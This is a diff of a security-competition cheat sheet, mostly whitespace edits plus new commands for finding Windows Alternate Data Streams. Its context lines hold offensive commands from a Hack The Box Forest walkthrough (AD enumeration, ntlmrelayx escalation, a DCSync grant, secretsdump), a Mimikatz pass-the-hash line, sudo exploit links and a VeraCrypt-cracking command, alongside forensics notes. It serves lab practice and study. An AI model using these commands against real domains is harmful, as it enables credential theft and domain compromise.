@@ -1,12 +1,12 @@
     =============================================================
-    
-    __________                         _________               
-    \______   \_______   ____   ______ \_   ___ \ __ ________  
-     |     ___/\_  __ \_/ __ \ /  ___/ /    \  \/|  |  \____ \ 
+
+    __________                         _________
+    \______   \_______   ____   ______ \_   ___ \ __ ________
+     |     ___/\_  __ \_/ __ \ /  ___/ /    \  \/|  |  \____ \
      |    |     |  | \/\  ___/ \___ \  \     \___|  |  /  |_> >
-     |____|     |__|    \___  >____  >  \______  /____/|   __/ 
-                            \/     \/          \/      |__|    
-    
+     |____|     |__|    \___  >____  >  \______  /____/|   __/
+                            \/     \/          \/      |__|
+
     =============================================================
 
 ==============================================
@@ -50,6 +50,11 @@
 ## Windows
 
 * Use `more` to open Alternate Data Streams
+    * `dir /r` to find files with Alternate Data Streams.
+    * Finding all files with ADS's (recursively):
+        * `dir /s /r | find ":$DATA"`
+        * Powershell equivalent: `gci -recurse | % { gi $_.FullName -stream * } | where {(stream -ne ':$Data') -and (stream -ne 'Zone.Identifier')}`
+            * Ignores ADS `Zone.identifier`; this tell MS whether a file was downloaded or locally created
 * Base64: `[System.Text.Encoding]::UTF8.GetSTring([System.convert]::FromBase64String("lkjasflkjasdfklj"))`
 * Mimikatz
     * `sekurlsa::pth /user:Administrator /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd`
@@ -79,7 +84,7 @@
 * Red Teaming
     * Forest HTB Walkthrough
         * RPCClient
-            * Null LDAP queries: rpcclient -U "" -n 10.10.10.161 
+            * Null LDAP queries: rpcclient -U "" -n 10.10.10.161
                 * enumdomusers
                 * enumdomgroups
         * Dump LDAP users: `impacket-GetADUsers -all -no-pass -dc-ip 10.10.10.161 htb.local/`
@@ -91,12 +96,12 @@
             * Bypass-4MSI
             * SharpHound.ps1
             * Invoke-BloodHound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
-        * Add a user to privileged group 
+        * Add a user to privileged group
             * $pass = ConvertTo-SecureString "password" -AsPlainText -Force
             * New-AdUser testt -AccountPassword $pass -Enabled $True
             * Add-ADGroupMember -Identity "Exchange Windows Permissions" -members testt
         * Escalate (without powerview)
-            * impacket-ntlmrelayx -t ldap://10.10.10.161 --escalate-user testt    (visit http://127.0.0.1) 
+            * impacket-ntlmrelayx -t ldap://10.10.10.161 --escalate-user testt    (visit http://127.0.0.1)
         * Escalate (with powerview)
             * Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity testt -Rights DCSync
         * impacket-secretsdump -dc-ip 10.10.10.161 htb.local/testt:password@10.10.10.161
@@ -119,7 +124,7 @@
     * `rsmangler -p -d -r -t -T -c -u -l -s -e -I --punctuation -a -C --pna --pnb --na -nb --force --space --file words.txt --output wordsmangled.txt`
 * Baron Samedit sudo vuln (CVE-2021-3156) - 1.8.2 to 1.8.31p2 and 1.9.0 to 1.9.5p1
     * https://github.com/blasty/CVE-2021-3156/
-    * https://github.com/TH3xACE/SUDO_KILLER/tree/master/exploits/CVE-2021-3156 <- different exploits for different versions. See readme, pick one. 
+    * https://github.com/TH3xACE/SUDO_KILLER/tree/master/exploits/CVE-2021-3156 <- different exploits for different versions. See readme, pick one.
 
 # DCO
 
@@ -136,7 +141,7 @@
 
 ### Misc
 * Convert pcapng to pcap
-    * editcap -F pcap test.pcapng test.pcap 
+    * editcap -F pcap test.pcapng test.pcap
 * Merge convert
     * mergecap -F pcap -w outfile.pcap infile_1.pcapng infile_2.pcapng
 * Distill to netflow
@@ -171,7 +176,7 @@
 
 ## Memory Forensics
 
-### SIFT 
+### SIFT
 * rekal -f image.vmem
     * > pslist
     * > procinfo <pid>
@@ -198,7 +203,7 @@
 * rekal for malicious procs
     * > describe(pstree) - View columns to output
     * > select \_EPROCESS,ppid,cmd,path from pstree()
-    * > malfind <pid> 
+    * > malfind <pid>
     * > ldrmodules <pid> verbosity=3   (detect unlinked dlls)
 
 * vol.py command –f /path/to/windows_xp_memory.img --profile=WinXPSP3x86
@@ -210,7 +215,7 @@
     * > procdump
     * > sockscan
     * > ... more -- see cheatsheet for everything else...
-	
+
 ## HDD Forensics
 * Assume all users are using the same box as your analysis box. If you want some info - replace your entire Program Files\whatever_program directory with theirs
 * log2timeline –r –p –z <system-timezone> –f <type-input> /mnt/windows_mount –w timeline.csv
@@ -256,7 +261,7 @@ $Events | Format-Table -Property TimeCreated,RuleName -AutoSize
 * Procmon:
     * Filter - Process Name is blah.exe then Include
     * Filter - Use Path contains c:\Users\student\desktop\Challenge\ then include
-* Always check for Shadow Volumes with Shadow Explorer 
+* Always check for Shadow Volumes with Shadow Explorer
 * Break veracrypt partitions: truecrack -t scada101.mp4 -c abcdefghijklmnopqrstuvwxyz -s 4 -m 4 -v -h
 * Extracting files to show metadata
     * mmls analysis.dd (shows partitions)
@@ -328,7 +333,7 @@ $Events | Format-Table -Property TimeCreated,RuleName -AutoSize
 
 # Escape Room Thoughts
 * Closely record all hints
-    * What items do you have? Where did you get them? 
+    * What items do you have? Where did you get them?
     * Which hints came from where?
     * What is the mentality of the individual in the environment?
 * What happens when boxes come online?
